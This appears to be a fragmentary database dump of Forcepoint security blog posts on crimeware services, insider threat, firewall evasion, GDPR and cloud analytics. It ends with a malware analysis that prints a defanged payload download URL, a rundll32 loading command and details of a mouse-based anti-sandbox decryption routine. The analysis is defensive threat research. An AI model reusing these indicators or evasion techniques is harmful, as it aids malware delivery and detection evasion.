features which are arguably inconsistent with this design brief, e.g. the ongoing maintenance of antivirus evasion capability (see below).\n\n\n\n\nFigure 1: Agent Tesla\'s changelog entry for 14 July 2017; note the updates being made to the antivirus evasion features\n\n\nAlthough they have not been discussed so far, any number of products ranging from tools targeted at penetration testers and red teams to legitimate remote administration applications have been used within malicious campaigns. Indeed, it was only last month that Forcepoint Security Labs discussed the frequent use of administration tools and capabilities built into Windows for malicious purposes.\n\nAn example of the former is the series of attacks against ATMs by the ‘Cobalt’ gang in 2016. This used elements of a number of security tools such as Cobalt Strike (presumably the naming inspiration for the gang but otherwise unrelated). For the latter, TeamViewer – much to the company’s chagrin – seems to be a popular choice.\n\n\n\n\nFigure 2: Features of Cobalt Strike\'s \'Beacon\' component\n\n\nPutting it all together\n\nThe ultimate upshot of this is a very low barrier of entry to cybercrime, even for endeavours such as corporate espionage which are perhaps easier to imagine to be the territory of organised criminals and APT-level threats.\n\nMalicious email campaigns distributing Agent Tesla have been seen targeting individuals within industries ranging from steel production to, rather specifically, procurement managers within the catering departments of Egyptian resort hotels. Given its transparent pricing (see below) and near immediate usability, Agent Tesla is well suited to would-be amateur spies.\n\n\n\n\nFigure 3: Agent Tesla\'s \'as-a-service\' pricing structure\n\n\nMoving up a league allows slightly more skilled attackers to put together relatively competent packages of malware – still without writing any code – by combining several tools available online, e.g. in the case of the Predator Pain sample noted in the previous post where obfuscation tools were used to hide a relatively old and readily identifiable piece of malware.\n\nAnother step up again and a malicious actor can simply use ‘glue code’ to combine the capabilities of various exploits and open-source tools found in repositories online. A significant number of these repositories exist (not linked here for obvious reasons) and provide a code-base from which to build out a semi-customised piece of malware based on pre-existing code.\n\nTo those without a development background code reuse like this may sound like an edge-case or the mark of an unskilled attacker, but ‘not reinventing the wheel’ is often key to successful development projects and, as already noted, even highly successful attackers such as the Cobalt gang have employed this technique. (As another example: how many pieces of malware have the ability to communicate via Tor? This capability is unlikely to have been written from scratch…)\n\nConclusion\n\nUnfortunately for those on the defending team, all of this makes it very easy to avoid static antivirus signatures. Indeed, many of the crypters and packers examined in the previous posts in this series espouse their ability to render malware fully undetectable (‘FUD’) – that is to say, they also evade heuristic antivirus signatures.\n\nWhile this quickly changes as samples percolate through the security ecosystem, the initial minutes of a malicious campaign are critical. During this time a determination of the sender or author’s intent needs to be made for all files received by an organisation, be that by web or email.\n\nAs ever, the human point of contact with data and systems is likely to be the easiest to compromise: despite constant user education programmes people can and do open ‘that’ attachment and click ‘that’ link. The determination of malicious intent therefore needs to happen before a user is exposed to the content.\n\nFortunately, this is entirely possible using technologies such as Forcepoint Advanced Malware Detection which performs a range of static and dynamic code analyses to provide visibility of previously unseen threats based on file behaviour.', 'https://www.forcepoint.com/blog/security-labs/part-three-criminal-overground\n');

From conversations in the conference hotel lobby – which served only to jump-start the networking buzz that carried through the week – to the rousing and impassioned opening addresses from Ms. Janice Glover-Jones, CIO Defense Intelligence Agency (DIA) and Lieutenant General Vincent Stewart, USMC, Director DIA, the message was clear: we are in the midst of 5th generation warfare – a cognitive warfare – in which we are fighting for information dominance in the protection of the United States, our Allies and the values we hold dear. And we ALL have a role to play!\n\n\n\n	Because of (and perhaps as a result of) this cognitive war being waged in cyberspace where there are no borders or boundaries, there must be more cohesive partnerships between agencies and the Five-Eyes partner nations with non-traditional nations and the private sector.

INSERT INTO `forcepoint` (`id`, `title`, `author`, `publishdate`, `content`, `url`) VALUES (56, 'Human-Centric Security in Financial Services Organizations ', 'Heath ThompsonSean BergVinny SharmaForcepoint ', '\n      \n    \n      \n      \n   ', 'Recently I had the opportunity to address the FFIEC 2017 in Alexandria, Virginia regarding Forcepoint’s view on technology and the cybersecurity landscape. This got me thinking about one of the most difficult-to-navigate sectors when it comes to securing critical data and IP: financial services.\n\n\n\n	Security has never been more important than it is today, and at the same time, the needs are not being met by current approaches. Breaches have risen in scale and proliferation, costing businesses millions. I’ve been working in cyber security since 1996, and in those 21 years I’ve seen little change in the approach. Collectively, we must change our thinking in terms of how we address the problem. That means not just vendors, but all of us who touch technology in our jobs.\n\n\n\n	Since we’re talking about financial services, let’s level with facts and figures. Over the past eight years, the customers of cyber security products and services have spent $298 BILLION, and over the next four years, the spend is projected to accelerate to $427 BILLION. What are we achieving with that massive security spend? Less than 50 percent of the organizations spending all that money say that this spend is making them more secure. In fact, 90-95 percent of all enterprise organizations have already been compromised, by either outsiders or insiders. The average cost of a single data breach is over $6M, with financial services breaches costing typically $245 per record breached. And the business impacts can occur in the form of regulatory fines and notification costs. In the US, for example, regulatory notifications alone run close to 700K per breach, while fines can range in the millions. You can see how hundreds, thousands and even millions of records being compromised can add up – and quickly.\n\n\n\n	TRENDS\n\n\n\n	One of the main secular trends today is obviously cloud migration, including sensitive government organizations and highly regulated industries. Sensitive data is now everywhere, no longer in just the data centers of the enterprise, but spread out in the data centers of Amazon, Microsoft, Google, and others. In fact, 95 percent of organizations are running either cloud apps or infrastructure-as-a-service today.  And for those applications that aren’t in public cloud, enterprises are using the same technical approaches utilizing private clouds.  On the average, the typical enterprise is running over 700 cloud apps and services.\n\n\n\n	Another change in the enterprise computing landscape is the use of mobile platforms and BYOD. Estimates are that by 2020, mobile devices will account for 42 percent of the computing done in the global workforce. And BYOD is huge today: 67 percent of all workers worldwide are using their own devices at work. And for all the advantages of cloud and mobile computing, there is also increased cost for data breaches.\n\n\n\n	Similarly, the use of mobile platforms in the enterprise has driven costs up to around $10M, mostly due to compliance failures associated with mobile platforms, particularly BYOD. We haven’t made progress here because we’re so focused on technology, and the IT landscape is shifting faster than our cyber security thinking.\n\n\n\n	OLD WORLD TACTICS\n\n\n\n	I like to bring up the Great Wall of China as a classic example in perimeter security. Once upon a time, you could keep the bad guys out with a huge, impenetrable wall. Today, do you think that wall does a great job of protecting the people of China? Of course not. It’s pretty hard to do in a global community; citizens are everywhere, jobs are everywhere, homes are everywhere. Threats are everywhere, too, including on the inside. Many companies are promoting the idea of the borderless enterprise, saying that the perimeter is gone. But the perimeter has simply changed. It’s no longer defined by the boundaries around the data center, the in-house network versus the Internet. It’s just not that simple now:  users and critical data are everywhere. Essentially, we’re living in the time of the ‘zero-perimeter.’\n\n\n\n	SECURITY TODAY\n\n\n\n	We talked about investment in tools and technology, which serve an important purpose, but cannot alone solve all of our security problems. Unfortunately, there is no easy fix to the problem – at least not by continuing to build on existing foundations and incrementalism.\n\n\n\n	Let’s consider the way enterprise security works today:\n\n\n\n		Point products solving specific problems. This is how the cyber security industry started, and how it is still being perpetuated. The average enterprise has 50-75 security products in production.\n	\n	\n		Sitting on top of these point products are SIEMs:  coalescing all security events into a single massive repository of low-level events, logs full of system details, IP addresses, and arcane information. SIEMs were created to become the single pane of glass for enterprise security, but they’ve become so overcrowded and full of noise that the signal is almost lost.\n	\n	\n		Big Data.  We’ve layered on top of SIEMs a thing called behavioral analytics which has introduced machine learning into the equation. This enables organizations to analyze a huge number of events in order to find a needle in the field of haystacks.\n	\n\n	How bad is this problem? We asked the CISO of one of Forcepoint’s customers, a major US bank, how many security events was he processing in his security operations centers on a daily basis.  The answer was a staggering 4.5 billion events a day. That’s 1.6 trillion events a year. And how many of those events are really valuable? Less than .01%. The question remains: how do you find those relevant events?\n\n\n\n	We asked that same CISO how many of the 60,000 users (accounts) on his network were potentially risky and needed closer scrutiny. His answer was less than a hundred! Now if we could look at the security landscape not in terms of events and threats and attacks, but in terms of users – people – we could reduce the problem space by many orders of magnitude.\n\n\n\n	WHERE DO WE LOOK FOR INSPIRATION?\n\n\n\n	If we buy into this notion, where should we search for inspiration? One thing I’ve begun to learn in my time working with Raytheon is that the folks responsible for protecting nation states truly think differently from most cyber security vendors. The adversary is already inside your perimeter. All those perimeter defenses, and all the other points of protecting presence have driven the enemy to the place where compromise is easiest and where it matters most:  inside the network. this can be an external attacker that has compromised the security of the enterprise, whose presence is lurking and operating inside your network using authorized credentials, or someone who’s actually permitted to be inside your network but with malicious intent. The attacker needs to get on the “inside” of the network, to gain access to privileged credentials to achieve their mission.  It’s the misuse of authorized access that actually causes all the risk.\n\n\n\n	HUMAN-CENTRIC SECURITY\n\n\n\n	Any insider, whether malicious or accidental, has privilege - whether through employment, accidentally, or by criminal means. This is the key. When I have privileged credentials on the entire enterprise network I can access financial data, customer data, strategy documents, employee records, company intellectual property – you name it.\n\n\n\n	Today, I might be an employee in good standing, but I could change over time. I could be making mistakes in my everyday job that put my company at risk, like emailing confidential spreadsheets to my personal email or copying them to my cloud-based file sharing account so I can work on them at home. I could also have clicked on a spear phishing link which has compromised my laptop, and now my credentials are being controlled by an outsider, a criminal. In this case, the “Heath” that’s visible on the network might not be Heath at all. This “Heath” might be accessing file shares and applications that I never would touch in the normal course of my job. I could become unhappy with my job and plan to leave, start stockpiling confidential information, and plan to take it with me.\n\n\n\n	 In any of these cases, the extent to which I could be a threat to my company is a matter of the intent of who’s in control of my credentials! If we could understand intent, we could understand whether my behavior indicates risk or acceptable use of my credentials. Technology alone cannot solve for this type of complexity and the various employees in your organization.\n\n\n\n	CYBER CONTINUUM OF INTENT\n\n\n\n	The Cyber Continuum of Intent is a spectrum of insiders within an organization – ranging from accidental to criminal actor. I laid out a few examples above that fall within this continuum. It’s important for organizations to understand that all of these examples are likely present within their organization today. Additionally, privacy is no longer finite. We give up a lot of information in order to use an app, yet the conversation becomes delicate when an organization wants to monitor employees. Would that be different if we knew it was for our collective digital and physical safety? And what if we were informed of the process and how that data would be used along the way? Third, we have to accept that technology is not magic. There are amazing technologies out there that can do incredible things, but a machine cannot always account for human intent and behavior. Lastly, we must acknowledge that everyone is responsible for security. It is about protecting employee wellbeing, livelihood and the overall health of the business. In other words, we need to focus on the human point.\n\n\n\n	EVERYONE TO THE DEFENSE\n\n\n\n	Implementing a culture of security, and living and breathing this mentality, will be the only way to catch up to our adversaries. The complexity brought about by the intersection of human beings and rapid technological change is at the heart of the next big step. We have to change our thinking and start looking inward to our organizations as a source of vulnerability, but also potential. The only way we can make progress and move forward is with a paradigm shift - to start focusing on the human point.', 'https://www.forcepoint.com/blog/insights/human-centric-security-financial-services-organizations\n');

The cyclical nature of technology concepts is constant, with only the players and methods changing. However, the instruments of data movement are getting smaller. In the past a person had to literally carry reams of paper out of the building to do the same kind of damage a person with a cell phone camera, cloud storage account, or a USB drive can today. Additionally, interconnections within the growing technology-enabled physical world and the infinitely connected web have allowed for more esoteric ways of information movement and access through the average smart home thermostat or wifi-enabled light bulb.\n\n\n\n	This newfound ability to deal damage in small packages has created a secondary issue: the accident. When data was big, taking the form of paper, floppy disks, or CD-ROMs, it took physical media or a lot of upload time to cause widespread harm. Again, this isn’t a concept any reasonable security practitioner is unaware of. In fact, I’m counting on it. The issue is not that there is growing risk and the world is harsh place, or that people will forever try to gain an unfair edge, but the reality that the line between maliciousness and accidents is growing ever greyer.\n\n\n\n	The Grey Area between Accidents and Maliciousness\n\n\n\n	When exfiltration and infiltration methods were complex and incredibly risky (think Cold War spy tactics) an accident would be defined as taking a folder of documents home, leaving a laptop on a train or having your Blackberry stolen. Now it is as simple as an unnoticed incorrect autocomplete address in Outlook with a sensitive attachment, or a misunderstanding about sensitivity and upload to a cloud drive. A mistakenly clicked email about a fake password reset can risk a whole company, just ask a few retailers or Hollywood producers.\n\n\n\n	This creates several avenues of discussion mainly around training and awareness (do it), thoughtful and effective controls (get some), and security analysis and response (make it tougher). The issue with insider issues is that mindset is everything. The motivation and goal of the actor is what determines the real difference between a stern lecture, employment termination or law enforcement arrest. Did the person really mis-click that link in the email? Did they really not notice the other address? Actually, they probably didn’t notice and just thought they had to provide their password. Realistically, there are only a few real-life Jason Bourne or Ethan Hunt types in the world -- and if those people were targeting you odds are you’d have little chance of stopping it.\n\n\n\n	We need to realize that people are people and not computers. If we approach insider threat analysis as a black and white issue like malware then we risk more than wasted time. If an analyst suspects a computer to be infected with malware, they can patch or re-image without a second thought. The computer won’t get offended or quit. But we all live in a world of greys, not black and white. The sooner we start to recognize that different tactics and analysis are needed to better assess activities to determine that mindset the better.\n\n\n\n	This isn’t about ignoring or discounting troubling events, it is about understanding context, asking questions and realizing that while we have machines learning how to identify malware patterns we just aren’t that good at people yet. A computer really can’t have good days and bad days, but people have every kind of day imaginable. Some end one day feeling like they need to take their traffic and coffee-fueled frustrations out on others and “get their due,” but go back home, have a Coke and a smile and then the next day is a bit brighter. Let’s look at insider threat as managing both the light and dark side of the human condition, and ensure that people are aware of the rules, we have good controls to help contain when they forget or break them, and analysis that isn’t based on “guilty before proven innocent.”\n\n\n\n	If you are in St. Louis attending DoDIIS today be sure to stop by Room 103 at 1:30 p.m. CT to hear more during the “Industry Perspective on Cyber Espionage and Insider Threat” panel. \n\n\n\n	Or, if you aren’t attending DoDIIS but would like to learn how you can “Operationalize a Practical Insider Threat Program” in your organization, view my webcast here.', 'https://www.forcepoint.com/blog/insights/notes-dodiis-2017-talking-cyber-espionage-and-insider-threat\n');

So once again, we headed into the desert for Black Hat 2017 where Opi spent time in sessions and then joined Jim presenting in Forcepoint’s exhibit booth. One of the big trends that Opi noticed was the move towards security fabrics, with more emphasis on holistic solutions rather than point products. We think this will be crucial; it’s part of how Forcepoint will be “protecting the human point” (but more on that another time).\n\n\n\n	Forcepoint did presentations every 15 minutes or so on a variety of topics, including two pertaining to network security “Why Evasions Are More Dangerous Than Ever” and “Top 3 Myths about Modern Firewalls – Debunked.” Almost all of the presentations in our booth had standing room only (representing several dozen people), including ours.\n\n\n\n	\n\n\n	Advanced evasion techniques seemed to be of particular interest to our attendees.  These are the ways that attackers manipulate the traffic they send to hide exploits and malware from network defenses. For example, a payload that is destined for a known vulnerability on a Windows laptop could be broken into pieces and sent out of order:\n\n\n\n	\n\n\n	If the firewall in the middle isn’t designed to defeat evasions, it won’t see the exploit or the malware payload that would get delivered. (Of course, one of the key design elements of Forcepoint’s NGFW is its ability to block millions of types of evasions.)\n\n\n\n	Why Evasions are Suddenly Even More Relevant\n\n\n\n	Evasions have become more important than ever. Recent attacks like WannaCry and Petya reflect a new approach being taken by cybercriminals. Rather than just relying on social engineering like phishing emails or drive-by downloads from compromised websites, modern attackers are resurrecting older vulnerability (such as the SMB bug that became infamous this spring) ways of getting into networks and propagating. In addition, they’re combining multiple techniques. Evasions, which are now part of common exploit toolkits, boost the effectiveness of attacks and can help keep them undetected longer, protecting the “investment” the cybercriminals have made in developing their attacks.\n\n\n\n	\n\n\n	 \n\n\n\n	That’s Where Evader by Forcepoint Comes In\n\n\n\n	To help people understand whether their network security devices are solid or full of evasive holes, we used Black Hat 2017 to begin demonstrating our latest version of Evader. This technology (it’s not a product and we don’t charge for it) provides a ready-made test lab for subjecting network devices to a wide variety of evasion techniques.\n\n\n\n	\n\n\n	Evader’s not for pentesting or launching arbitrary attacks, but makes it immediately clear when attacks get through. You simply select which vendor’s device you wish to test (we have a variety of them set up in a lab with security settings on them turn up to their maximum level of protection):\n\n\n\n	\n\n\n	Then select the type of evasions and attack you want to use:\n\n\n\n	\n\n\n	Finally, click “Execute” and watch the target screen (which is running in a virtual machine). Depending upon the attack that was selected, within seconds a successful evasion will cause a window (like a calculator or shell) to appear on the target or the target to blue-screen.\n\n\n\n	Evasions are what caused so many vendors in this year’s NSS Labs NGFW Test to fall out of the RECOMMENDED quadrant. NSS has begun ramping up their use of evasions to provide visibility to an issue that many vendors seem to otherwise sweep under the rug. We’re glad to see them doing it – with attackers combining techniques and using vulnerabilities to spread, evasions leave a huge gap that has to be filled.\n\n\n\n	For more information about Evader, or to get your own live demonstration, please visit the Evader website.', 'https://www.forcepoint.com/blog/insights/one-place-where-evasions-couldn%E2%80%99t-hide-evader-black-hat-2017\n');

The result has been a significant expenditure of time and money on low-value add activity that is common across institutions and an evolution of capabilities that is too slow and sporadic to meet the need.\n\n\n\n	This is changing though as the community has had an influx of forward thinking leaders both within and from outside the banks, technology has become an enabler to collaboration, and there are proven models to learn from such as the FS-ISAC. The benefits of collaboration are many, but I believe two of the most impactful will be:\n\n\n\n	1. Standards & Common Understanding\n	I participated in a small group breakfast with the compliance and controls leadership from five of the top global banks last week. Much of the discussion was around the challenge each bank faced in creating a “holistic assessment of trader risk.” The difficulties are many, but most fundamental was a question of how do they take all of the available data on their people and synthesize it into something that is both understandable and actionable.\n\n\n\n	The group didn’t solve the problem in that breakfast, but they did figure out how to get to a solution — collaborate to create a common methodology for assessment and visualization. This type of collaboration will have very direct benefit to the banks, but also to the regulators who are charged with understanding and promoting best practices and to vendors who will know that the product they are building meets the definition of what all banks want.\n\n\n\n	2. Removal of Knowledge Gaps\n	The community typically has gaps around two categories of knowledge. First are the strategic gaps around best practices for processes, technology, and organizational design that define the construct of each organization’s supervisory process. A common example of this gap that I’ve personally seen over the past several years has been a lack of understanding regarding how powerful today’s technology is and what it should allow them to do. As a result, many firms have been stuck with an outdated view of what is achievable.  \n\n\n\n	The second, tactical gaps, are the instances of missing knowledge about people, events, information, and behaviors that are the subject of the surveillance activity itself. A powerful example of this is found in eComms surveillance where earlier this year I learned that a small set of traders had started using the Nando’s menu as code words and only a small few in the community were aware. In a world of effective and institutionalized collaboration as one institution discovers this behavior, all peer institutions should immediately benefit from that knowledge.\n\n\n\n	So, Is Collaboration Inevitable at This Point?\n\n\n\n	Unfortunately, while the collaborative momentum in the industry is powerful and growing, it isn’t yet an inevitability. So, how can the community continue to build on this increased desire to collaborate?\n\n\n\n	1. Champion Collaboration Internally\n	Controls and compliance teams have significant pressure from both internal and external constituencies and that can often result in restrictive and risk averse postures. While leaders will have to forcefully advocate for collaboration to overcome internal hurdles, they now have an ability to increasingly point to their industry peers — at a firm and personal level — as examples of how collaboration can materially improve the firm’s controls and compliance efforts and overall risk posture.\n\n\n\n	2. Get Plugged Into the Community\n	There are some very interesting and powerful community led initiatives coming to fruition now that include eComms surveillance, holistic surveillance, conduct risk training, and more. We are pleased to be a participant in many of these along with Armstrong Wolfe whose CCO & COO forums have been the starting point for many of these new collaborations.\n\n\n\n	3. Actively Identify Opportunities for Collaboration\n	The community is just at the early stages of collaboration and there are undoubtedly many more areas for collaboration than have been identified so far. In addition, as the practice of surveillance rapidly evolves over the next several years, it will be critical to ensure that it does so in a way where the community first asks “how can we do this” versus “how can I do this.\n\n\n\n	4. Smartly Leverage Technology\n	A core consideration for all new technology decisions must be: “how does this help me take advantage of the community’s collective knowledge and capability.” This means leveraging technologies that are open, have clear standards and APIs, and don’t lock you into an information and technology bubble. The good news is that with today’s technologies you should have no limits here, but be wary as those creating the solutions may have different views and incentives that result in more restrictive implementations.\n\n\n\n	\n		The community’s collaboration efforts will undoubtedly have the most significant impact on its ability to successfully meet their intense regulatory and internal mandates. More so than technology alone or regulatory changes. For this reason, we are excited to be in the middle of this movement and look forward to helping the community drive and capitalize on the opportunities it presents.', 'https://www.forcepoint.com/blog/insights/why-banks-need-collaborate-compliance-order-survive\n');

While grueling, the event is also a worthwhile and fun trip.\n\n\n\n	Aside from the stream of media and analyst meetings I had there, I was at the conference to present around the tricky problem of ‘pre-crime’ – the idea that we can predict a user’s probability of misbehaving either accidentally or intentionally. While this sounds like the stuff of science fiction (the talk title was sparked by the Philip K. Dick short story “The Minority Report”, and the movie of the same name), technical advances have made these types of human-centric predictions quite achievable. And, as we all know, with that great power comes great responsibility (thank you, Ben Parker).\n\n\n\n	The science of this falls under “predictive analytics”, though one would be forgiven for missing this term in the sea of Black Hat buzzwords. The basic idea is that we can use past history combined with knowledge about the present to make predictions about likely futures. These predictions aren’t like a Magic 8 Ball – that is, they don’t necessarily come true, and when they do, it’s certainly not by magic. Instead, they are most definitely in the realm of real science, and as such their accuracy can be measured, rated, and tuned.\n\n\n\n	As an industry, we’ve done this with respect to potentially malicious infrastructure before, but it has the potential to become a little disturbing when applied to people. The difference, of course, is that packets don’t have feelings. When you block a website based upon a prediction, typically there is not too much at stake. That is not to say a false positive doesn\'t matter, but it’s all relative. When you apply that logic to a person, however, it is a very different story.\n\n\n\n	My central thesis at Black Hat was that predictive analytics with respect to human behavior is a very powerful tool, but also poses a significant risk to employee/employer relationships. This is particularly true when we confuse mitigating a risk with penalizing, or otherwise punishing, a person for something they haven’t done yet.\n\n\n\n	Let’s take a look at the following example.\n\n\n\n	The use of predictive analytics for determining that a user is considering leaving an organization is already pretty common. In fact, it’s often used for enhancing employee retention. That’s a huge positive and helps teams stay together. Conversely, in the insider threat space, the knowledge that an employee is probably leaving can have darker overtones. Since many studies have shown that a large percentage of employees will steal corporate data when they leave, one can consider the prediction of departure as a risk indicator. This in turn increases the probability that a data move by the user represents a theft. This is both an opportunity and a problem.\n\n\n\n	On one hand, an employer has the right and a duty to protect its corporate IP. The employer being concerned that an action carries with it a bit more risk is a good thing. The trick is what is done with that knowledge. One option is to limit that user’s access – but that is essentially penalizing a user for something they haven’t done yet. Another approach might be to increase monitoring, so if data is stolen, the company has some form of remediation. Finally, one could imagine dynamically and silently encrypting data that is moved off a managed device. If that data moves back to another corporate device, it is decrypted, and all is well. If it is moved to a personal device, it’s protected and locked up in a nice encrypted package.\n\n\n\n	The point here is that context is everything and we must use these analytics in a human-first way. Each of the mitigations above works technically, but only one really wins from the human perspective. Humans are not predictable, neat streams of 1s and 0s, and shouldn’t be treated as such. Analytics that allow us to predict an employee’s likely future cannot be used in a way that disadvantages that employee in the workplace. In fact, they should be used to head off potential trouble, mitigating potential damages, and ultimately strengthening the relationship between the company and its employees.\n\n\n\n	Sadly, this human-first approach is still in its infancy in the industry. While walking the floor in the exhibit halls, I saw a lot of uses for big data, but my fear is – and remains – that these powerful predictive analytics algorithms will end up being deployed based on numbers, not on people. In that world, we all lose. The only way forward using predictive analytics responsibly is with a “human first” approach.', 'https://www.forcepoint.com/blog/insights/human-first-approach-predictive-analytics\n');

But what are the biggest concerns around this among businesses? How are organisations prioritising their preparations around the legislation? And what do companies really think about the regulation?\n\n\n\n	To find out, Forcepoint recently partnered with Computing Magazine to survey 100 business decision makers, representing companies ranging in size from fewer than 250 employees to organisations with thousands, across a range of industry sectors. The full report, GDPR - The Final Countdown is available here.\n\n\n\n	When asked what they saw as the hardest aspect of GDPR to comply with, the biggest concern was the right of erasure (the right to be forgotten). This was stated by over half (51%) of those surveyed, with around one in four also saying they are not particularly or at all confident that they would be ready to honour requests made under this rule.\n\n\n\n	This suggests that good data practices have perhaps been neglected across UK businesses, with IT professionals concerned about the location or status of people’s data records. It may also indicate that companies have concerns about their data supply chains, as they begin to understand, monitor and make sense of the data flowing in and out of their organisations to date.\n\n\n\n	Surprisingly, just 27% of respondents outlined the 72 hour breach notification rule (the window businesses have to inform authorities of a data breach within) as being the biggest challenge. Similarly, only a quarter of those surveyed highlighted the requirement that personal data can only be transferred to countries/multinationals with comparable data protection standards to the EU.\n\n\n\n	Both of these elements of the regulation are expected to have a significant impact on UK businesses, and while the reasons behind the results are not clear, it is possible that the current EU-US Privacy Shield agreement has impacted the latter. This covers data transfer to and from EU and the US, meaning that many of those surveyed may already be on top of this requirement, thereby making it less of a concern. However, provisions in the GDPR go a lot further than the aforementioned legal framework, particularly on the issue of self-certification.\n\n\n\n	Just 27% of respondents identified the 72 hour breach notification rule as being the toughest feature of the GDPR to comply with, and it may be that within the range of industry types surveyed, financial, healthcare or legal firms were well represented as these companies already have strict regulation about data breach notification - or it may be that companies are genuinely confident that they will be able to comply with this requirement.\n\n\n\n	In addition, all those surveyed were also asked for their thoughts on the exact wording of data breach notification requirements, which means that even the loss of an unencrypted USB stick must be reported. Interestingly, the majority (53%) of respondents outlined that they were broadly in favour of this stipulation, but waiting to see the fine print, and also in all likelihood the first court cases brought under the regulation. \n\n\n\n	GDPR will also have an impact on businesses using cloud services with data centres based outside of the EU, as it will only take minimal use of an international public cloud to potentially put an organisation in breach. For example, storing personal information in a local folder that is then synchronised to a cloud storage service such as Box, Dropbox or OneDrive.\n\n\n\n	The vast majority of those surveyed considered the usage of cloud services to be a business risk, with only 13% of respondents discounting this risk. On deeper examination of specific concerns, the top worry was fear over not being sure where data resides/sovereignty issues (52%), closely followed by having a lack of direct control (47%) and perceived issues over compliance with laws and regulations (45%).\n\n\n\n	Forcepoint was pleased to see that on the whole, the adoption of the GDPR is viewed positively, with 41% of those surveyed agreeing that ‘most data protection regulations are necessary as they create a stable business or professional environment, even if complying can be hard at times’. More than a quarter (27%) went as far as to concur that ‘while some data protection regulations are an excessive burden, in general they ensure best practice and innovation, which is a positive thing’.\n\n\n\n	With critical data everywhere within organisations today, and all too often in parallel with personal data on employee devices, it’s challenging for businesses to see how and where data is used. A data breach, be it a malicious or unintentional act, ultimately inflicts the most damage at the points in which people interact with critical business data and intellectual property. These ‘human points’ of interaction have the potential to undermine even the most comprehensively-designed systems.\n\n\n\n	If you examine these interactions and understand how and why they occur, we believe security professionals will be better able to manage how and why people create risk. We hope that the GDPR will further encourage businesses to adopt such an approach.\n\n\n\n	For more information and to read the full report, visit: GDPR - The Final Countdown.', 'https://www.forcepoint.com/blog/insights/gdpr-final-countdown\n');

Forcepoint’s industry leading DLP has integrated a form of UBA, Incident Risk Ranking, into Web Security and Email Security as recently as May.

Over the last two days, my friends and I presented over 60 presentations at the Forcepoint booth on topics ranging from Minority Report to User-Focused Data Protection, to my personal favorite, “Why UBA is essential for the Cloud.” The response was amazing as the audience sizes and demonstrations at our solution pod can attest to. If you weren’t able to attend this year and are interested in why behavior analytics are so important for protecting your cloud use, this blog is for you.\n\n\n\n	While the majority of companies are focused on telling the story of their technology, let’s instead focus on your users and employees of your organization, as you adopt cloud. For example, let’s imagine a fictional employee, we’ll call her “Ira,” representing a roaming user who accesses sanctioned file sharing applications to get her work done. That’s straightforward, isn’t it? But what would happen if, through her use of your cloud instance from her personal device accessed through public wifi, her cloud credentials, username and password were intercepted? How long would it take your organization to notice that someone had taken over Ira’s accounts and because of her role in the organization, had access to your business IP?\n\n\n\n	\n\n\n\n	Aaron Smith presents Why UBA is essential for the Cloud\n\n\n\n	It’s crucial to understand that we all have typical patterns: we don’t use random computers to do our work – we use the same one for both work and personal shopping and leisure browsing. We tend to work from the same locations. Generally, we access the same files most of the time. That’s our behavior. But what happens when something different occurs – anomalous behavior?\n\n\n\n	How would your organization detect when an employee accesses a cloud application from a different device in a far flung location and the traffic never traverses your network security? Would you even notice it? What if this occurrence was 10% of your users? Where would you focus your attention? This is why Forcepoint CASB has invested in behavior analytics in the cloud. UBA isn’t new, but we have innovated to help companies protect themselves through better understanding of how employees access cloud – and helping them to respond before something bad happens.\n\n\n\n	\n\n\n\n	To further emphasize this need, esecurityplanet published an article which highlights the need for CASB solutions amongst large enterprises. Six Top CASB Vendors both informs why you need a CASB product and serves to remind us that “95% of cloud security failures will be caused by human failings, rather than cloud service provider security failings.” We agree. And so it is timely that Forcepoint CASB now provides the industry’s most complete behavior analytics along with automation to help enterprise and government security teams reduce time to action by focusing on the business impact of highest risk users.\n\n\n\n	\n\n\n\n	Your organization is likely adopting cloud applications and it is crucial that you understand your requirements for securing the information stored within those apps. Forcepoint can help you assess your current cloud adoption, from Shadow IT to sanctioned apps, and provide a comprehensive solution that protects your users and your data – wherever they reside.', 'https://www.forcepoint.com/blog/insights/why-behavior-analytics-matter-protecting-your-cloud-use\n');

If this fails, a second attempt will be made to another site: ‘hxxp://inshaengineeringindustries[.]com/head.pkl’. These files are in fact DLL files which have been designed to be loaded through WMI: \n\n\nrundll32 [malwarepath] DllRegisterServer\n\nThis malicious DLL is packed and again padded with lots of garbage code to hamper static analysis attempts. During execution, it will drop a second DLL file, map this new DLL to the current address, fix the Import Address Table and Relocation Table, then finally jump into the entry point to execute.\n\nThe dropped DLL first does self-checking on integrity and then:\n\nPerforms anti-sandboxing checks\n	Performs anti-VM checks\n	Implements persistence through an autorun registry key\n	Injects itself into the ‘explorer.exe’ process\nThe remainder of this analysis will focus on the new mouse-based anti-sandboxing/decryption capabilities.\n\nAnti-Sandboxing Checks\n\nThe algorithm used by this sample uses the difference between the current and previous recorded mouse coordinates to detect mouse movement and avoid sandbox environments where the mouse is not usually moved. It further uses the value generated by this process to ‘brute force’ its own decryption key.\n\nStep One – Key Generation\n\nFirstly, the malware calculates the D-Value (delta) between the x- and y-coordinates of the last and current mouse position. It then selects the sum of the .BSS section’s Relative Virtual Address (RVA) and ‘SizeOfRawData’ value as a base seed.\n\nIt XORs the base seed with the file creation time (in this case ‘Apr 11 2017’) to get a value which is added to the lowest 5 bits of the mouse D-Value to get the decryption key.\n\n\n\nStep Two – Decode .BSS Section\n\nThe malware loops through the .BSS section of the DLL one DWORD at a time, XORing the current DWORD data with the last DWORD data. This value is then XORed with the decryption key generated above and right-rotated by the loop count. The ‘current’ DWORD is then replaced.\n\n\n\nStep Three – Verify the Deciphering Key\n\nAfter .BSS section data is decoded, three values are acquired from offsets 0x61d, 0x619, and 0x625 in the .BSS section, and their sum compared with checksum ‘0EE553B4E’. If this matches, it will execute the rest of the code, otherwise it has to restore the encrypted .BSS section raw data and try to re-calculate new key for another attempt at the decryption and verification operation.\n\n\n\nIf run in sandbox environment, since the D-value based on the mouse movement always is 0, the ‘BSS’ section is always inaccurately decoded and will loop execution of same code. While in a realistic environment, due to only using the lowest 5 bits of D-value rather than the full 32 bits, it is more likely to get correct value to decode section data.\n\nThe decryption key itself is an important global constant which will be used in subsequent code to decode APIs, a hidden PE file (DLL file in this variant), synchronous objects, Registry data, URLs, etc.\n\nIn addition, the decoding operations are implemented at run time, preventing memory analysers from dumping the whole plaintext string stream of malware memory, e.g.\n\nDecoding Windows APIs used for further injection operations:\n\n\n\nWith the aid of the decryption key, an additional embedded PE file (a 3rd DLL file) can be safely extracted from data section of the second DLL file, released to a temporary buffer, and injected into the ‘explore.exe’ process.\n\n\n\nProtection Statement\n\nForcepoint customers are protected against this threat via Forcepoint Cloud and Network Security, which includes the Advanced Classification Engine (ACE) as part of e-mail, web and 